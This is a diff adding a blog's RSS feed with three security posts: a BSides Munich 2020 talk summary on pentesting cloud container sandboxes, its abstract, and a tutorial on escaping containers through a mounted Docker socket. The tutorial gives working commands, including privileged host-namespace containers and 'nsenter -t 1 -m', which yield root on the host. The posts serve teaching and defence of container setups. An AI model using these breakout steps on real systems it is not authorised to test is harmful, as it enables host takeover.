@@ -1,0 +1,607 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Docker on Nody´s blog</title>
+    <link>http://nodyhub.github.io/tags/docker/</link>
+    <description>Nody´s blog (Docker)</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 23 Aug 2020 16:30:00 +0200</lastBuildDate>
+    
+    <atom:link href="http://nodyhub.github.io/tags/docker/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Pentesting Cloud Sandboxes in the wild</title>
+      <link>http://nodyhub.github.io/posts/bsides-munich-2020/</link>
+      <pubDate>Sun, 23 Aug 2020 16:30:00 +0200</pubDate>
+      
+      <guid>http://nodyhub.github.io/posts/bsides-munich-2020/</guid>
+      <description>&lt;p&gt;Matthias and I talked about cloud sandboxes on &lt;a href=&#34;https://2020.bsidesmunich.org/&#34;&gt;virtual BSides Munich 2020&lt;/a&gt;. This blogpost summarizes the content of the talk.&lt;/p&gt;
+&lt;p&gt;First, shout out to the BSides Munich Orga team to make the conference happen. Matthias and I were thankful to have the pleasure to contribute to the event. Furthermore, another thank you to the other speakers, who shared their research during this weird virtual-conference-times!&lt;/p&gt;
+&lt;p&gt;We started our talk with a short re-cap about containers, based on the amazing talk “Fucking Containers – how do they work?” from Andreas Krebs which was presented on BSides Munich 2019 (&lt;a href=&#34;https://2019.bsidesmunich.org/talks/01-03_Fucking-Containers/&#34;&gt;Ref&lt;/a&gt;, &lt;a href=&#34;https://raw.githubusercontent.com/BSidesMUC/BsidesMunich2019/master/files/01-03_Fucking-Containers.pdf&#34;&gt;Slides&lt;/a&gt;).&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;../../images/akrebs-container.png&#34; alt=&#34;A. Krebs F***ing Containers&#34;&gt;&lt;/p&gt;
+&lt;p&gt;After the re-cap and disclaimer, we start to go through well-known container breakout techniques. To make a long story short, we start with a &lt;strong&gt;root filesystem&lt;/strong&gt;, which is &lt;strong&gt;accessible from a container&lt;/strong&gt;. In that case, you have to &lt;strong&gt;leverage basic Linux privileges escalation techniques&lt;/strong&gt;, by abusing services from the host system.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;../../images/Attacking_Container_filesystem.png&#34; alt=&#34;Attack Container Filesystem&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Afterward, we address the configuration issue, which may occur if you have access to the Linux kernel by a &lt;strong&gt;writable &lt;code&gt;/sys&lt;/code&gt; directory&lt;/strong&gt;. In that way, you can &lt;strong&gt;create a call-back&lt;/strong&gt; script that is &lt;strong&gt;triggered if a device is plugged&lt;/strong&gt; into the system – which can also be simulated. Next breakout would be by &lt;strong&gt;exploitation&lt;/strong&gt; of the existence of the &lt;strong&gt;capability &lt;code&gt;CAP_SYS_MODULE&lt;/code&gt;&lt;/strong&gt; to &lt;strong&gt;load kernel modules&lt;/strong&gt; and the &lt;strong&gt;capability &lt;code&gt;CAP_SYS_ADMIN&lt;/code&gt;&lt;/strong&gt; to leverage &lt;strong&gt;Linux control groups (cgroups)&lt;/strong&gt; to get out of the box. If you have &lt;strong&gt;access to the devices &lt;code&gt;/dev&lt;/code&gt;&lt;/strong&gt; of the container host, you can go and &lt;strong&gt;mount&lt;/strong&gt; the &lt;strong&gt;hard drive&lt;/strong&gt; and access the root filesystem, as explained prior. And we give a quick reference to what could be done with the &lt;code&gt;/proc/keys&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;../../images/Attacking_Container_hardware-kernel.png&#34; alt=&#34;Attack Container Hardware and Kernel&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The last technique, which seems to be very local-docker-installation related is the container with &lt;strong&gt;access to the Docker socket&lt;/strong&gt;. With access to the Docker socket, you can &lt;strong&gt;start&lt;/strong&gt; further &lt;strong&gt;container with “super-powers”&lt;/strong&gt;, which allows you previously explained techniques.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;../../images/Attacking_Container_socket.png&#34; alt=&#34;Attack Container ctrl plane&#34;&gt;&lt;/p&gt;
+&lt;p&gt;A detailed explanation of these attacks can be found on this blog &lt;a href=&#34;https://blog.nody.cc/posts/container-breakouts-part2/&#34;&gt;Container Breakouts – Part 1&lt;/a&gt;, &lt;a href=&#34;https://blog.nody.cc/posts/container-breakouts-part2/&#34;&gt;Container Breakouts – Part 2&lt;/a&gt; and &lt;a href=&#34;https://blog.nody.cc/posts/container-breakouts-part2/&#34;&gt;Container Breakouts – Part 3&lt;/a&gt;. You may now think “why do they include the Docker socket within the breakout list?”. That’s the point. Nowadays, a cloud container runtime may come in various flavors. You never know if the container is started within a Kubernetes environment or own-created orchestration layer. We will finally address the container breakout by the usage of the metadata API. The metadata API of the cloud is the control plane of the cloud, like the docker socket is the control plain of the local docker installation.&lt;/p&gt;
+&lt;p&gt;After discussing the various breakout techniques, we go through a short comparison from wide-spread cloud container runtimes. (We decided to let Kubernetes runtimes out of the comparison). The following screenshot shows the overview table.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;../../images/plattform-comp.png&#34; alt=&#34;Cloud Platform Comparison&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The data is measured with &lt;a href=&#34;https://github.com/brompwnie/botb&#34;&gt;botb&lt;/a&gt; and &lt;a href=&#34;https://github.com/genuinetools/amicontained/&#34;&gt;amicontained&lt;/a&gt;. All technical details can be found on &lt;a href=&#34;https://github.com/NodyHub/bsidesmuc2020&#34;&gt;Github&lt;/a&gt;, including the scan results of both tools.&lt;/p&gt;
+&lt;p&gt;After summarization of the attack vectors, we go through the details of how &lt;a href=&#34;https://github.com/brompwnie/botb&#34;&gt;botb&lt;/a&gt; and &lt;a href=&#34;https://github.com/genuinetools/amicontained/&#34;&gt;amicontained&lt;/a&gt; can be used by you, maybe in the next assessment?&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;../../images/botb.png&#34; alt=&#34;BotB usage&#34;&gt;&lt;/p&gt;
+&lt;p&gt;With the knowledge about the attacks, we go through the mitigation techniques that can be used to prevent breakouts and tune the security of your sandbox. Finally, a conclusion and an outline with further work close the session.&lt;/p&gt;
+&lt;p&gt;We hope that you enjoyed the session and if you are interested to discuss content, do not hesitate and get in touch.&lt;/p&gt;
+&lt;p&gt;Cheers,&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://twitter.com/uchi_mata&#34;&gt;Matthias&lt;/a&gt; and &lt;a href=&#34;https://twitter.com/NodyTweet&#34;&gt;Jan&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&amp;ndash;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;../../publication/202008_bsides_muc.pdf&#34;&gt;Slides&lt;/a&gt; or &lt;a href=&#34;https://gurke.io/bsidesmuc2020&#34;&gt;Google Slides&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://youtu.be/5urnOPb-BbY?t=948&#34;&gt;Recording&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/NodyHub/bsidesmuc2020&#34;&gt;Scan results on GitHub&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://www.bsidesmunich.org/&#34;&gt;BSides Munich&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</description>
+    </item>
+    
+    <item>
+      <title>Pentesting Cloud Sandboxes in the wild</title>
+      <link>http://nodyhub.github.io/publication/2020-bsidesmuc/</link>
+      <pubDate>Sat, 01 Aug 2020 15:11:49 +0200</pubDate>
+      
+      <guid>http://nodyhub.github.io/publication/2020-bsidesmuc/</guid>
+      <description>&lt;p&gt;Matthias Luft &amp;amp; Jan Harrie, Bsides Munich, Munich/Virtual, Germany&lt;/p&gt;
+&lt;h2 id=&#34;abstract&#34;&gt;Abstract&lt;/h2&gt;
+&lt;p&gt;Building on last year’s explanation of container workings under the hood (&lt;a href=&#34;https://2019.bsidesmunich.org/talks/01-03_Fucking-Containers/&#34;&gt;Fucking Containers - how do they work?&lt;/a&gt;), we explain several techniques for breaking out of misconfigured containers/container hosts. We will discuss the most common misconfigurations (such as extensive container privileges, exposed network services, mounted sockets, internal cluster privileges) and how to test for them. For each discussed attack vector, we will show how it can be automated (and integrated into build pipelines) using a tool of choice. Finally, a comparison of the well known container execution platforms (AWS, Azure, fly.io, GCP, Heroku) will be presented.&lt;/p&gt;
+&lt;h2 id=&#34;outline&#34;&gt;Outline&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Short Container Re-Cap (make sure to be familiar with &lt;a href=&#34;https://2019.bsidesmunich.org/talks/01-03_Fucking-Containers/&#34;&gt;Fucking Containers - how do they work?&lt;/a&gt;)&lt;/li&gt;
+&lt;li&gt;Attack Vectors
+&lt;ul&gt;
+&lt;li&gt;Container Privileges&lt;/li&gt;
+&lt;li&gt;Network Services (Generic, Cloud, Cluster)&lt;/li&gt;
+&lt;li&gt;Cluster Privileges&lt;/li&gt;
+&lt;li&gt;Sockets&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Testing how-to with botb and amicontained&lt;/li&gt;
+&lt;li&gt;Cloud Platform comparison&lt;/li&gt;
+&lt;li&gt;Conclusions&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;media&#34;&gt;Media&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;../202008_bsides_muc.pdf&#34;&gt;Slides&lt;/a&gt; or &lt;a href=&#34;https://gurke.io/bsidesmuc2020&#34;&gt;Google Slides&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/NodyHub/bsidesmuc2020&#34;&gt;Material&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://youtu.be/5urnOPb-BbY?t=948&#34;&gt;Recording&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;../../posts/bsides-munich-2020/&#34;&gt;Blogbost&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</description>
+    </item>
+    
+    <item>
+      <title>Container Breakouts – Part 3: Docker Socket</title>
+      <link>http://nodyhub.github.io/posts/container-breakouts-part3/</link>
+      <pubDate>Thu, 30 Jul 2020 14:20:35 +0200</pubDate>
+      
+      <guid>http://nodyhub.github.io/posts/container-breakouts-part3/</guid>
+      <description>&lt;p&gt;This post is part of a series and shows container breakout techniques that can be performed if a container is started with a mounted Docker socket inside the container.&lt;/p&gt;
+&lt;p&gt;The following posts are part of the series:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;../container-breakouts-part1&#34;&gt;Part 1: Access to root directory of the Host&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;../container-breakouts-part2&#34;&gt;Part 2: Privileged Container&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Part 3: Docker Socket&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;intro&#34;&gt;Intro&lt;/h2&gt;
+&lt;p&gt;You may have read for certain container deployments that it is absolutely necessary to link the socket into the container, but what are the implications? That is exactly what we are going to discuss in the last blog post in the series about container breakouts.&lt;/p&gt;
+&lt;h2 id=&#34;docker-socket&#34;&gt;Docker Socket&lt;/h2&gt;
+&lt;p&gt;You know, every time you have &lt;strong&gt;access to the Docker Socket&lt;/strong&gt; (default location: &lt;code&gt;/var/run/docker.sock&lt;/code&gt;) it &lt;strong&gt;means&lt;/strong&gt; that you are &lt;strong&gt;root on the host&lt;/strong&gt;. Here should be mentioned that it might be the case that you are not root on the system, if docker is used root-less. Some containerized applications may need access to the socket, e.g., for observation or local system management.&lt;/p&gt;
+&lt;p&gt;You have read correctly, local system management. As soon you have &lt;strong&gt;access to&lt;/strong&gt; the &lt;strong&gt;socket&lt;/strong&gt;, you can &lt;strong&gt;manage&lt;/strong&gt; the local &lt;strong&gt;system&lt;/strong&gt;. Okay, first at all, you can manage containers and these containers can afterward manage the system.&lt;/p&gt;
+&lt;p&gt;So if you want to escalate from the container to the system, you can &lt;strong&gt;interact&lt;/strong&gt; with the &lt;strong&gt;Docker Socket manually or&lt;/strong&gt; just simple &lt;strong&gt;install Docker&lt;/strong&gt; (on ubuntu: &lt;code&gt;sudo apt update &amp;amp;&amp;amp; sudo apt install -y docker.io&lt;/code&gt;) in the container. What the next step? Exactly, start a further container.&lt;/p&gt;
+&lt;h3 id=&#34;known-techniques&#34;&gt;Known Techniques&lt;/h3&gt;
+&lt;p&gt;First at all I will start with a short re-cap. We can start containers with the root directory mounted into the container. To do so, one must run the following command and continue reading with &lt;a href=&#34;../container-breakouts-part1&#34;&gt;Part 1&lt;/a&gt; of this series.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;~# docker run --rm -it -v/:/hostfs ubuntu bash
+root@95bc051624b9:/# 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The alternative would be to start a privileged container. This privileged container can interact with the kernel without limitations. To do so, one must run the following command and continue reading with &lt;a href=&#34;../container-breakouts-part2&#34;&gt;Part 2&lt;/a&gt; of this series.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;~# docker run --rm --privileged -it ubuntu bash   
+root@aad2c9378900:/#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;These steps are a bit obvious, but explain what hove done wrong in the other cases&lt;/p&gt;
+&lt;h3 id=&#34;dropping-namespace-boundaries&#34;&gt;Dropping Namespace Boundaries&lt;/h3&gt;
+&lt;p&gt;As we can take from the amazing artwork by &lt;a href=&#34;https://twitter.com/b0rk&#34;&gt;Julia Evans&lt;/a&gt; and we already know that containerization is done by the use of Linux namespaces (details can be found in the man page &lt;code&gt;man namespaces&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;../../images/container-ns.jpeg&#34; alt=&#34;container namespaces&#34; title=&#34; Container namespaces by [Julia Evans](https://twitter.com/b0rk)&#34;&gt;&lt;/p&gt;
+&lt;p&gt;To get details about which namespace is assigned to a process, we can take this information out of the &lt;code&gt;proc&lt;/code&gt; filesystem (for each process &lt;code&gt;ls -l /proc/self/ns/&lt;/code&gt;). The following namespaces are created for the start of a new container in the default configuration:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;inter process communication (&lt;code&gt;ipc&lt;/code&gt;)&lt;/li&gt;
+&lt;li&gt;mount (&lt;code&gt;mnt&lt;/code&gt;)&lt;/li&gt;
+&lt;li&gt;network (&lt;code&gt;net&lt;/code&gt;)&lt;/li&gt;
+&lt;li&gt;process id (&lt;code&gt;pid&lt;/code&gt;)&lt;/li&gt;
+&lt;li&gt;hostname (&lt;code&gt;uts&lt;/code&gt;)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The &lt;a href=&#34;https://www.cisecurity.org/benchmark/docker/&#34;&gt;CIS Docker Benchmark&lt;/a&gt; recommends as well to configure docker in a way to spawn an own user namespace (&lt;code&gt;uid&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;If we want to break out of the container to get full system access we &lt;strong&gt;start&lt;/strong&gt; a new &lt;strong&gt;container with all (possible) namespaces&lt;/strong&gt; from the host via the docker socket. Only the &lt;code&gt;mnt&lt;/code&gt; namespace cannot be set at container startup. Since we start our container &lt;strong&gt;privileged&lt;/strong&gt;, there is no seccomp filter in place and we can use &lt;code&gt;nsenter&lt;/code&gt; to &lt;strong&gt;switch&lt;/strong&gt; to &lt;strong&gt;mount namespace&lt;/strong&gt; of the &lt;code&gt;init&lt;/code&gt; process.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;~# ls -l /proc/self/ns/
+total &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+lrwxrwxrwx &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; user user &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; 09:02 cgroup -&amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cgroup:[4026531835]&amp;#39;&lt;/span&gt;
+lrwxrwxrwx &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; user user &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; 09:02 ipc -&amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ipc:[4026532376]&amp;#39;&lt;/span&gt;
+lrwxrwxrwx &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; user user &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; 09:02 mnt -&amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mnt:[4026532374]&amp;#39;&lt;/span&gt;
+lrwxrwxrwx &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; user user &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; 09:02 net -&amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;net:[4026532379]&amp;#39;&lt;/span&gt;
+lrwxrwxrwx &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; user user &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; 09:02 pid -&amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pid:[4026532377]&amp;#39;&lt;/span&gt;
+lrwxrwxrwx &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; user user &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; 09:02 pid_for_children -&amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pid:[4026532377]&amp;#39;&lt;/span&gt;
+lrwxrwxrwx &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; user user &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; 09:02 user -&amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user:[4026531837]&amp;#39;&lt;/span&gt;
+lrwxrwxrwx &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; user user &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; Jul &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; 09:02 uts -&amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;uts:[4026532375]&amp;#39;&lt;/span&gt;
+
+~# docker run --rm -it --privileged --network host --pid host --ipc host --uts host ubuntu  bash
+
+root@arch:/# nsenter -t &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; -m
+
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;root@arch /&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ls -l /proc/self/ns/&lt;/span&gt;
+total &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+lrwxrwxrwx &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; 15. Jul 11:34 cgroup -&amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cgroup:[4026531835]&amp;#39;&lt;/span&gt;
+lrwxrwxrwx &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; 15. Jul 11:34 ipc -&amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ipc:[4026531839]&amp;#39;&lt;/span&gt;
+lrwxrwxrwx &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; 15. Jul 11:34 mnt -&amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mnt:[4026531840]&amp;#39;&lt;/span&gt;
+lrwxrwxrwx &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; 15. Jul 11:34 net -&amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;net:[4026531992]&amp;#39;&lt;/span&gt;
+lrwxrwxrwx &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; 15. Jul 11:34 pid -&amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pid:[4026531836]&amp;#39;&lt;/span&gt;
+lrwxrwxrwx &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; 15. Jul 11:34 pid_for_children -&amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pid:[4026531836]&amp;#39;&lt;/span&gt;
+lrwxrwxrwx &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; 15. Jul 11:34 user -&amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user:[4026531837]&amp;#39;&lt;/span&gt;
+lrwxrwxrwx &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; 15. Jul 11:34 uts -&amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;uts:[4026531838]&amp;#39;&lt;/span&gt;
+
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;root@arch /&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# ls -l /proc/1/ns/&lt;/span&gt;
+total &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+lrwxrwxrwx &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; 15. Jul 11:03 cgroup -&amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cgroup:[4026531835]&amp;#39;&lt;/span&gt;
+lrwxrwxrwx &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; 15. Jul 11:03 ipc -&amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ipc:[4026531839]&amp;#39;&lt;/span&gt;
+lrwxrwxrwx &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; 15. Jul 11:03 mnt -&amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mnt:[4026531840]&amp;#39;&lt;/span&gt;
+lrwxrwxrwx &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; 15. Jul 11:03 net -&amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;net:[4026531992]&amp;#39;&lt;/span&gt;
+lrwxrwxrwx &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; 15. Jul 11:03 pid -&amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pid:[4026531836]&amp;#39;&lt;/span&gt;
+lrwxrwxrwx &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; 15. Jul 11:03 pid_for_children -&amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pid:[4026531836]&amp;#39;&lt;/span&gt;
+lrwxrwxrwx &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; 15. Jul 11:03 user -&amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;user:[4026531837]&amp;#39;&lt;/span&gt;
+lrwxrwxrwx &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; 15. Jul 11:03 uts -&amp;gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;uts:[4026531838]&amp;#39;&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can now behave as a user &lt;code&gt;root&lt;/code&gt; with full access to the host system.&lt;/p&gt;
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;The final breakout technique was a bit more detailed about what docker does under the hood to secure containers. But, if you are root and can interact with the socket, there are no limitations. The last approach is the most OpSec-safe approach for easy container break out techniques.&lt;/p&gt;
+&lt;p&gt;The listed container breakouts are in my humble opinion the most relevant one. The list is for sure not complete and as soon as I identify another important one, I will update, extend, and re-organize the content.&lt;/p&gt;
+&lt;p&gt;I hope you enjoyed my little series and I am looking forward to if one of you has some ideas for extending container breakouts.&lt;/p&gt;
+&lt;h2 id=&#34;remarks&#34;&gt;Remarks&lt;/h2&gt;
+&lt;p&gt;The list of proposed techniques is not complete and is mainly based on insecure container management. To name a few previous container breakouts that are based on vulnerabilities in docker here is a list to get an idea:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html&#34;&gt;CVE-2019-5736: Escape from Docker and Kubernetes containers to root on host&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://unit42.paloaltonetworks.com/docker-patched-the-most-severe-copy-vulnerability-to-date-with-cve-2019-14271/&#34;&gt;Docker Patched the Most Severe Copy Vulnerability to Date With CVE-2019-14271&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;At the end of writing, I realized that &lt;a href=&#34;mailto:jesse.hertz@nccgroup.trust&#34;&gt;Jesse Hertz&lt;/a&gt; from &lt;a href=&#34;https://www.nccgroup.com/&#34;&gt;NCC Group&lt;/a&gt; has released &lt;a href=&#34;https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container_whitepaper.pdf&#34;&gt;Abusing Privileged and Unprivileged Linux Containers&lt;/a&gt; which is an even more comprehensive collection to breakout of a container. A collection of tools that test for container breakouts have been collected by &lt;a href=&#34;https://twitter.com/clintgibler&#34;&gt;Clint Gibler&lt;/a&gt; in &lt;a href=&#34;https://tldrsec.com/blog/container-security/&#34;&gt;Container Security – A collection of container security resources and tools, organized by category&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;The focus of this series was on the operating system level. Nowadays containers are managed and orchestrated in a cluster environment by &lt;a href=&#34;https://kubernetes.io/&#34;&gt;Kubernetes&lt;/a&gt; or &lt;a href=&#34;https://www.nomadproject.io/&#34;&gt;Nomad&lt;/a&gt; to name at least two. Even the whole cloud stack is kept out of this series. These two areas will be addressed in another series.&lt;/p&gt;
+&lt;h2 id=&#34;final-words&#34;&gt;Final words&lt;/h2&gt;
+&lt;p&gt;Since I am only a consumer of already existing research I want to give out a big thanks for sharing the knowledge that I have consumed in the past years from:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://twitter.com/bradgeesaman&#34;&gt;Brad Geesaman&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://twitter.com/brompwnie&#34;&gt;Chris Le Roy&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://twitter.com/clintgibler&#34;&gt;Clint Gibler&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://twitter.com/mauilion&#34;&gt;Duffie Cooley&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://twitter.com/IanColdwater&#34;&gt;Ian Coldwater&lt;/a&gt;&lt;/li&gt;
